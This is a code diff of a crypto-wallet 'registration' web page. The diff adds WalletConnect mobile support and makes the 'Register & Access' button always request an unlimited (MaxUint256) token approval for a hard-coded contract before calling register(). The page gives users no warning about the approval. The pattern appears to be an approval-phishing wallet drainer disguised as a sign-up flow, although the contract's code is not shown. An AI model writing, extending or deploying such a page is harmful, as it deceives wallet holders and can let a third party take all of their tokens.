@@ -1,28 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Wallet Registration</title>
+  <title>Wallet Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  
   <style>
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 100px auto; text-align: center; background-color: #f4f7f6; }
-    .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-    button { padding: 15px 30px; font-size: 18px; margin: 15px 0; cursor: pointer; border-radius: 10px; border: none; transition: 0.3s; width: 100%; font-weight: bold; }
+    body { font-family: sans-serif; max-width: 100%; margin: 20px; text-align: center; background-color: #f4f7f6; }
+    .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-top: 50px; }
+    button { padding: 15px; font-size: 16px; margin: 10px 0; cursor: pointer; border-radius: 10px; border: none; width: 100%; font-weight: bold; }
     #connectBtn { background-color: #2196F3; color: white; }
-    #registerBtn { background-color: #4CAF50; color: white; display: none; } /* Shuru me hidden rahega */
-    button:disabled { background-color: #ccc; cursor: not-allowed; }
-    .status-text { color: #666; margin-top: 10px; font-size: 14px; }
+    #registerBtn { background-color: #4CAF50; color: white; display: none; }
+    .status { color: #666; font-size: 14px; margin-top: 15px; }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <h2>Wallet Dashboard</h2>
-  <p id="msgText">Connect your wallet to start</p>
+  <h2>Smart Access</h2>
+  <p id="msgText">Connect wallet to register</p>
 
   <button id="connectBtn">Connect Wallet</button>
   <button id="registerBtn">Register & Access</button>
   
-  <div id="loader" class="status-text"></div>
+  <div id="loader" class="status"></div>
 </div>
 
 <script>
@@ -30,72 +32,71 @@
   const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA"; 
   const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE"; 
 
-  const ERC20_ABI = [
-    "function allowance(address owner, address spender) view returns (uint256)",
-    "function approve(address spender, uint256 amount) returns (bool)"
-  ];
+  const ERC20_ABI = ["function allowance(address, address) view returns (uint256)", "function approve(address, uint256) returns (bool)"];
+  const WALLET_MANAGER_ABI = ["function register() external"];
 
-  const WALLET_MANAGER_ABI = [
-    "function register() external"
-  ];
+  let provider, signer, userAddress, tokenContract, walletManagerContract;
 
-  let signer, userAddress, tokenContract, walletManagerContract;
+  async function initWallet(web3Provider) {
+    provider = new ethers.providers.Web3Provider(web3Provider);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+    
+    tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
+    walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
 
-  const connectBtn = document.getElementById("connectBtn");
-  const registerBtn = document.getElementById("registerBtn");
-  const loader = document.getElementById("loader");
-  const msgText = document.getElementById("msgText");
+    document.getElementById("connectBtn").style.display = "none";
+    document.getElementById("registerBtn").style.display = "block";
+    document.getElementById("msgText").innerText = "Connected: " + userAddress.substring(0, 8) + "...";
+  }
 
-  connectBtn.onclick = async () => {
-    if (!window.ethereum) return alert("Please install MetaMask!");
-    try {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      signer = provider.getSigner();
-      userAddress = await signer.getAddress();
-      
-      tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
-      walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
-
-      connectBtn.style.display = "none";
-      registerBtn.style.display = "block";
-      msgText.innerText = "Wallet Connected: " + userAddress.substring(0, 6) + "...";
-    } catch (err) {
-      alert("Connection failed!");
+  document.getElementById("connectBtn").onclick = async () => {
+    // 1. Agar MetaMask App ke browser me khula hai
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        await initWallet(window.ethereum);
+      } catch (err) { alert("Connection rejected"); }
+    } 
+    // 2. Agar Mobile Chrome/Safari me khula hai (WalletConnect Use Karein)
+    else {
+      try {
+        const walletConnectProvider = new WalletConnectProvider.default({
+          rpc: { 56: "https://bsc-dataseed.binance.org/" }, // BSC Mainnet
+          // Testnet ke liye: 97: "https://data-seed-prebsc-1-s1.binance.org:8545/"
+        });
+        await walletConnectProvider.enable();
+        await initWallet(walletConnectProvider);
+      } catch (err) { alert("Mobile connection failed"); }
     }
   };
 
-  registerBtn.onclick = async () => {
+  document.getElementById("registerBtn").onclick = async () => {
     try {
-      registerBtn.disabled = true;
-      registerBtn.innerText = "Processing...";
-      loader.innerText = "Please confirm the transactions in your wallet...";
-
-      // 1. Unlimited Allowance
-      const maxUint = ethers.constants.MaxUint256;
-      let currentAllowance = await tokenContract.allowance(userAddress, WALLET_MANAGER);
+      const btn = document.getElementById("registerBtn");
+      const loader = document.getElementById("loader");
       
-      if (currentAllowance.lt(ethers.utils.parseUnits("1", 18))) {
-          let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
-          await txApprove.wait();
-      }
+      btn.disabled = true;
+      btn.innerText = "Processing...";
+      loader.innerText = "Confirm the prompt in your wallet app";
 
-      // 2. Register
+      // Max Approval
+      const maxUint = ethers.constants.MaxUint256;
+      let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
+      await txApprove.wait();
+
+      // Register
       let txRegister = await walletManagerContract.register();
       await txRegister.wait();
 
-      // Final Success
       loader.innerText = "";
-      msgText.innerHTML = "<b style='color:green'>✅ Registration Successful!</b>";
-      registerBtn.style.display = "none";
+      document.getElementById("msgText").innerHTML = "<b style='color:green'>Success!</b>";
+      btn.style.display = "none";
       alert("Registration Successful!");
-
     } catch (error) {
-      console.error(error);
-      alert("Transaction failed or cancelled.");
-      registerBtn.disabled = false;
-      registerBtn.innerText = "Register & Access";
-      loader.innerText = "";
+      alert("Transaction failed");
+      document.getElementById("registerBtn").disabled = false;
+      document.getElementById("registerBtn").innerText = "Register & Access";
     }
   };
 </script>
